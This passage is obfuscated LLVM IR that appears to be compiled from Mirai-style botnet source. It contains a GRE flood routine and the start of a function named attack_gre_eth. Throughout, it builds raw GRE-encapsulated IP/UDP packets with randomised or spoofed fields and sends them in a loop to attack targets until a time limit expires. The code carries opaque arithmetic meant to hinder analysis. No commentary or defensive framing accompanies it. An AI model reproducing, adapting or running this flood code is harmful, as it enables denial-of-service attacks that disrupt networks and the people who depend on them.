  %86 = trunc i64 %84 to i32
  store i32 %86, i32* %24, align 4
  %87 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %87, i32* %12, align 4
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %5
  br label %567

; <label>:90:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %91 = load i32, i32* %12, align 4
  %92 = bitcast i32* %11 to i8*
  %93 = call i32 @setsockopt(i32 %91, i32 0, i32 3, i8* %92, i32 4) #6
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* %12, align 4
  %97 = call i32 @close(i32 %96)
  br label %567

; <label>:98:                                     ; preds = %90
  store i32 0, i32* %11, align 4
  br label %99

; <label>:99:                                     ; preds = %326, %98
  %100 = load i32, i32* %11, align 4
  %101 = load i8, i8* %7, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  br i1 %103, label %104, label %332

; <label>:104:                                    ; preds = %99
  %105 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %106 = load i8**, i8*** %13, align 8
  %107 = load i32, i32* %11, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8*, i8** %106, i64 %108
  store i8* %105, i8** %109, align 8
  %110 = load i8**, i8*** %13, align 8
  %111 = load i32, i32* %11, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8*, i8** %110, i64 %112
  %114 = load i8*, i8** %113, align 8
  %115 = bitcast i8* %114 to %struct.iphdr*
  store %struct.iphdr* %115, %struct.iphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i64 1
  %118 = bitcast %struct.iphdr* %117 to %struct.grehdr*
  store %struct.grehdr* %118, %struct.grehdr** %26, align 8
  %119 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %120 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %119, i64 1
  %121 = bitcast %struct.grehdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %27, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %28, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = xor i8 %130, -1
  %133 = xor i8 64, -1
  %134 = xor i8 -82, -1
  %135 = and i8 %132, -82
  %136 = and i8 %130, %134
  %137 = and i8 %133, -82
  %138 = and i8 64, %134
  %139 = or i8 %135, %136
  %140 = or i8 %137, %138
  %141 = xor i8 %139, %140
  %142 = or i8 %132, %133
  %143 = xor i8 %142, -1
  %144 = or i8 -82, %134
  %145 = and i8 %143, %144
  %146 = or i8 %141, %145
  %147 = or i8 %130, 64
  store i8 %146, i8* %126, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 -16, -1
  %152 = xor i8 %150, %151
  %153 = and i8 %152, %150
  %154 = and i8 %150, -16
  %155 = xor i8 %153, -1
  %156 = xor i8 5, -1
  %157 = xor i8 -110, -1
  %158 = and i8 %155, -110
  %159 = and i8 %153, %157
  %160 = and i8 %156, -110
  %161 = and i8 5, %157
  %162 = or i8 %158, %159
  %163 = or i8 %160, %161
  %164 = xor i8 %162, %163
  %165 = or i8 %155, %156
  %166 = xor i8 %165, -1
  %167 = or i8 -110, %157
  %168 = and i8 %166, %167
  %169 = or i8 %164, %168
  %170 = or i8 %153, 5
  store i8 %169, i8* %149, align 4
  %171 = load i8, i8* %14, align 1
  %172 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 1
  store i8 %171, i8* %173, align 1
  %174 = load i32, i32* %20, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 0, %175
  %177 = sub i64 52, %176
  %178 = add i64 52, %175
  %179 = trunc i64 %177 to i16
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 2
  store i16 %180, i16* %182, align 2
  %183 = load i16, i16* %15, align 2
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 3
  store i16 %184, i16* %186, align 4
  %187 = load i8, i8* %16, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 %187, i8* %189, align 4
  %190 = load i8, i8* %17, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %196

; <label>:192:                                    ; preds = %104
  %193 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 4
  store i16 %193, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %104
  %197 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 6
  store i8 47, i8* %198, align 1
  %199 = load i32, i32* %23, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 8
  store i32 %199, i32* %201, align 4
  %202 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %203 = load i32, i32* %11, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 1
  %207 = load i32, i32* %206, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  %210 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %211 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %212 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %211, i32 0, i32 1
  store i16 %210, i16* %212, align 2
  %213 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %214 = bitcast %struct.iphdr* %213 to i8*
  %215 = load i8, i8* %214, align 4
  %216 = xor i8 15, -1
  %217 = xor i8 %215, %216
  %218 = and i8 %217, %215
  %219 = and i8 %215, 15
  %220 = and i8 %218, 64
  %221 = xor i8 %218, 64
  %222 = or i8 %220, %221
  %223 = or i8 %218, 64
  store i8 %222, i8* %214, align 4
  %224 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %225 = bitcast %struct.iphdr* %224 to i8*
  %226 = load i8, i8* %225, align 4
  %227 = xor i8 %226, -1
  %228 = xor i8 -16, -1
  %229 = xor i8 67, -1
  %230 = or i8 %227, %228
  %231 = or i8 67, %229
  %232 = xor i8 %230, -1
  %233 = and i8 %232, %231
  %234 = and i8 %226, -16
  %235 = and i8 %233, 5
  %236 = xor i8 %233, 5
  %237 = or i8 %235, %236
  %238 = or i8 %233, 5
  store i8 %237, i8* %225, align 4
  %239 = load i8, i8* %14, align 1
  %240 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 1
  store i8 %239, i8* %241, align 1
  %242 = load i32, i32* %20, align 4
  %243 = sext i32 %242 to i64
  %244 = sub i64 28, 2261862616514748116
  %245 = add i64 %244, %243
  %246 = add i64 %245, 2261862616514748116
  %247 = add i64 28, %243
  %248 = trunc i64 %246 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  %252 = load i16, i16* %15, align 2
  %253 = zext i16 %252 to i32
  %254 = xor i32 %253, -1
  %255 = and i32 -1, %254
  %256 = xor i32 -1, -1
  %257 = and i32 %253, %256
  %258 = or i32 %255, %257
  %259 = xor i32 %253, -1
  %260 = trunc i32 %258 to i16
  %261 = call zeroext i16 @htons(i16 zeroext %260) #7
  %262 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 3
  store i16 %261, i16* %263, align 4
  %264 = load i8, i8* %16, align 1
  %265 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 5
  store i8 %264, i8* %266, align 4
  %267 = load i8, i8* %17, align 1
  %268 = icmp ne i8 %267, 0
  br i1 %268, label %269, label %273

; <label>:269:                                    ; preds = %196
  %270 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %271 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 4
  store i16 %270, i16* %272, align 2
  br label %273

; <label>:273:                                    ; preds = %269, %196
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 6
  store i8 17, i8* %275, align 1
  %276 = call i32 @rand_next()
  %277 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 8
  store i32 %276, i32* %278, align 4
  %279 = load i8, i8* %22, align 1
  %280 = icmp ne i8 %279, 0
  br i1 %280, label %281, label %287

; <label>:281:                                    ; preds = %273
  %282 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  %284 = load i32, i32* %283, align 4
  %285 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 9
  store i32 %284, i32* %286, align 4
  br label %307

; <label>:287:                                    ; preds = %273
  %288 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 8
  %290 = load i32, i32* %289, align 4
  %291 = sub i32 0, 1024
  %292 = add i32 %290, %291
  %293 = sub i32 %290, 1024
  %294 = xor i32 %292, -1
  %295 = and i32 -1586727258, %294
  %296 = xor i32 -1586727258, -1
  %297 = and i32 %292, %296
  %298 = xor i32 -1, -1
  %299 = and i32 %298, -1586727258
  %300 = and i32 -1, %296
  %301 = or i32 %295, %297
  %302 = or i32 %299, %300
  %303 = xor i32 %301, %302
  %304 = xor i32 %292, -1
  %305 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 9
  store i32 %303, i32* %306, align 4
  br label %307

; <label>:307:                                    ; preds = %287, %281
  %308 = load i16, i16* %18, align 2
  %309 = call zeroext i16 @htons(i16 zeroext %308) #7
  %310 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  store i16 %309, i16* %311, align 2
  %312 = load i16, i16* %19, align 2
  %313 = call zeroext i16 @htons(i16 zeroext %312) #7
  %314 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 1
  store i16 %313, i16* %315, align 2
  %316 = load i32, i32* %20, align 4
  %317 = sext i32 %316 to i64
  %318 = sub i64 8, 4537272179744473506
  %319 = add i64 %318, %317
  %320 = add i64 %319, 4537272179744473506
  %321 = add i64 8, %317
  %322 = trunc i64 %320 to i16
  %323 = call zeroext i16 @htons(i16 zeroext %322) #7
  %324 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %325 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %324, i32 0, i32 2
  store i16 %323, i16* %325, align 2
  br label %326

; <label>:326:                                    ; preds = %307
  %327 = load i32, i32* %11, align 4
  %328 = add i32 %327, -2110813900
  %329 = add i32 %328, 1
  %330 = sub i32 %329, -2110813900
  %331 = add nsw i32 %327, 1
  store i32 %330, i32* %11, align 4
  br label %99

; <label>:332:                                    ; preds = %99
  br label %333

; <label>:333:                                    ; preds = %566, %332
  store i32 0, i32* %11, align 4
  br label %334

; <label>:334:                                    ; preds = %554, %333
  %335 = load i32, i32* %11, align 4
  %336 = load i8, i8* %7, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp slt i32 %335, %337
  br i1 %338, label %339, label %560

; <label>:339:                                    ; preds = %334
  %340 = load i8**, i8*** %13, align 8
  %341 = load i32, i32* %11, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds i8*, i8** %340, i64 %342
  %344 = load i8*, i8** %343, align 8
  store i8* %344, i8** %29, align 8
  %345 = load i8*, i8** %29, align 8
  %346 = bitcast i8* %345 to %struct.iphdr*
  store %struct.iphdr* %346, %struct.iphdr** %30, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i64 1
  %349 = bitcast %struct.iphdr* %348 to %struct.grehdr*
  store %struct.grehdr* %349, %struct.grehdr** %31, align 8
  %350 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %351 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %350, i64 1
  %352 = bitcast %struct.grehdr* %351 to %struct.iphdr*
  store %struct.iphdr* %352, %struct.iphdr** %32, align 8
  %353 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %354 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %353, i64 1
  %355 = bitcast %struct.iphdr* %354 to %struct.udphdr*
  store %struct.udphdr* %355, %struct.udphdr** %33, align 8
  %356 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i64 1
  %358 = bitcast %struct.udphdr* %357 to i8*
  store i8* %358, i8** %34, align 8
  %359 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %360 = load i32, i32* %11, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 2
  %364 = load i8, i8* %363, align 4
  %365 = zext i8 %364 to i32
  %366 = icmp slt i32 %365, 32
  br i1 %366, label %367, label %391

; <label>:367:                                    ; preds = %339
  %368 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %369 = load i32, i32* %11, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 1
  %373 = load i32, i32* %372, align 4
  %374 = call i32 @ntohl(i32 %373) #7
  %375 = call i32 @rand_next()
  %376 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %377 = load i32, i32* %11, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i32 0, i32 2
  %381 = load i8, i8* %380, align 4
  %382 = zext i8 %381 to i32
  %383 = lshr i32 %375, %382
  %384 = add i32 %374, -2016883896
  %385 = add i32 %384, %383
  %386 = sub i32 %385, -2016883896
  %387 = add i32 %374, %383
  %388 = call i32 @htonl(i32 %386) #7
  %389 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 9
  store i32 %388, i32* %390, align 4
  br label %391

; <label>:391:                                    ; preds = %367, %339
  %392 = load i32, i32* %23, align 4
  %393 = icmp eq i32 %392, -1
  br i1 %393, label %394, label %398

; <label>:394:                                    ; preds = %391
  %395 = call i32 @rand_next()
  %396 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 8
  store i32 %395, i32* %397, align 4
  br label %398

; <label>:398:                                    ; preds = %394, %391
  %399 = load i16, i16* %15, align 2
  %400 = zext i16 %399 to i32
  %401 = icmp eq i32 %400, 65535
  br i1 %401, label %402, label %432

; <label>:402:                                    ; preds = %398
  %403 = call i32 @rand_next()
  %404 = xor i32 %403, -1
  %405 = xor i32 65535, -1
  %406 = xor i32 1560454836, -1
  %407 = or i32 %404, %405
  %408 = or i32 1560454836, %406
  %409 = xor i32 %407, -1
  %410 = and i32 %409, %408
  %411 = and i32 %403, 65535
  %412 = trunc i32 %410 to i16
  %413 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 3
  store i16 %412, i16* %414, align 4
  %415 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 3
  %417 = load i16, i16* %416, align 4
  %418 = zext i16 %417 to i32
  %419 = add i32 %418, 1076010006
  %420 = sub i32 %419, 1000
  %421 = sub i32 %420, 1076010006
  %422 = sub nsw i32 %418, 1000
  %423 = xor i32 %421, -1
  %424 = and i32 -1, %423
  %425 = xor i32 -1, -1
  %426 = and i32 %421, %425
  %427 = or i32 %424, %426
  %428 = xor i32 %421, -1
  %429 = trunc i32 %427 to i16
  %430 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 3
  store i16 %429, i16* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %402, %398
  %433 = load i16, i16* %18, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  br i1 %435, label %436, label %445

; <label>:436:                                    ; preds = %432
  %437 = call i32 @rand_next()
  %438 = xor i32 65535, -1
  %439 = xor i32 %437, %438
  %440 = and i32 %439, %437
  %441 = and i32 %437, 65535
  %442 = trunc i32 %440 to i16
  %443 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 0
  store i16 %442, i16* %444, align 2
  br label %445

; <label>:445:                                    ; preds = %436, %432
  %446 = load i16, i16* %19, align 2
  %447 = zext i16 %446 to i32
  %448 = icmp eq i32 %447, 65535
  br i1 %448, label %449, label %458

; <label>:449:                                    ; preds = %445
  %450 = call i32 @rand_next()
  %451 = xor i32 65535, -1
  %452 = xor i32 %450, %451
  %453 = and i32 %452, %450
  %454 = and i32 %450, 65535
  %455 = trunc i32 %453 to i16
  %456 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %457 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %456, i32 0, i32 1
  store i16 %455, i16* %457, align 2
  br label %458

; <label>:458:                                    ; preds = %449, %445
  %459 = load i8, i8* %22, align 1
  %460 = icmp ne i8 %459, 0
  br i1 %460, label %465, label %461

; <label>:461:                                    ; preds = %458
  %462 = call i32 @rand_next()
  %463 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 9
  store i32 %462, i32* %464, align 4
  br label %471

; <label>:465:                                    ; preds = %458
  %466 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 9
  %468 = load i32, i32* %467, align 4
  %469 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 9
  store i32 %468, i32* %470, align 4
  br label %471

; <label>:471:                                    ; preds = %465, %461
  %472 = load i8, i8* %21, align 1
  %473 = icmp ne i8 %472, 0
  br i1 %473, label %474, label %481

; <label>:474:                                    ; preds = %471
  %475 = load i8*, i8** %34, align 8
  %476 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %475, i32 %476)
  %477 = load i8*, i8** %34, align 8
  %478 = load i32, i32* %20, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds i8, i8* %477, i64 %479
  store i8 0, i8* %480, align 1
  br label %481

; <label>:481:                                    ; preds = %474, %471
  %482 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 7
  store i16 0, i16* %483, align 2
  %484 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %485 = bitcast %struct.iphdr* %484 to i16*
  %486 = call zeroext i16 @checksum_generic(i16* %485, i32 20)
  %487 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 7
  store i16 %486, i16* %488, align 2
  %489 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 7
  store i16 0, i16* %490, align 2
  %491 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %492 = bitcast %struct.iphdr* %491 to i16*
  %493 = call zeroext i16 @checksum_generic(i16* %492, i32 20)
  %494 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 7
  store i16 %493, i16* %495, align 2
  %496 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %497 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %496, i32 0, i32 3
  store i16 0, i16* %497, align 2
  %498 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %499 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %500 = bitcast %struct.udphdr* %499 to i8*
  %501 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %502 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %501, i32 0, i32 2
  %503 = load i16, i16* %502, align 2
  %504 = load i32, i32* %20, align 4
  %505 = sext i32 %504 to i64
  %506 = sub i64 8, 2940039449994224101
  %507 = add i64 %506, %505
  %508 = add i64 %507, 2940039449994224101
  %509 = add i64 8, %505
  %510 = trunc i64 %508 to i32
  %511 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %498, i8* %500, i16 zeroext %503, i32 %510)
  %512 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %513 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %512, i32 0, i32 3
  store i16 %511, i16* %513, align 2
  %514 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %515 = load i32, i32* %11, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i64 %516
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i32 0, i32 0
  %519 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %518, i32 0, i32 0
  store i16 2, i16* %519, align 4
  %520 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %521 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %520, i32 0, i32 9
  %522 = load i32, i32* %521, align 4
  %523 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %524 = load i32, i32* %11, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i64 %525
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i32 0, i32 0
  %528 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %527, i32 0, i32 2
  %529 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %528, i32 0, i32 0
  store i32 %522, i32* %529, align 4
  %530 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %531 = load i32, i32* %11, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i64 %532
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i32 0, i32 0
  %535 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %534, i32 0, i32 1
  store i16 0, i16* %535, align 2
  %536 = load i32, i32* %12, align 4
  %537 = load i8*, i8** %29, align 8
  %538 = load i32, i32* %20, align 4
  %539 = sext i32 %538 to i64
  %540 = sub i64 52, 8045853140140934967
  %541 = add i64 %540, %539
  %542 = add i64 %541, 8045853140140934967
  %543 = add i64 52, %539
  %544 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %545 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %546 = load i32, i32* %11, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i32 0, i32 0
  %550 = bitcast %struct.sockaddr_in* %549 to %struct.sockaddr*
  store %struct.sockaddr* %550, %struct.sockaddr** %544, align 8
  %551 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %552 = load %struct.sockaddr*, %struct.sockaddr** %551, align 8
  %553 = call i64 @sendto(i32 %536, i8* %537, i64 %542, i32 16384, %struct.sockaddr* %552, i32 16)
  br label %554

; <label>:554:                                    ; preds = %481
  %555 = load i32, i32* %11, align 4
  %556 = add i32 %555, -835985989
  %557 = add i32 %556, 1
  %558 = sub i32 %557, -835985989
  %559 = add nsw i32 %555, 1
  store i32 %558, i32* %11, align 4
  br label %334

; <label>:560:                                    ; preds = %334
  %561 = call i64 @time(i64* null) #6
  %562 = load i32, i32* %24, align 4
  %563 = sext i32 %562 to i64
  %564 = icmp sgt i64 %561, %563
  br i1 %564, label %565, label %566

; <label>:565:                                    ; preds = %560
  br label %567

; <label>:566:                                    ; preds = %560
  br label %333

; <label>:567:                                    ; preds = %565, %95, %89
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
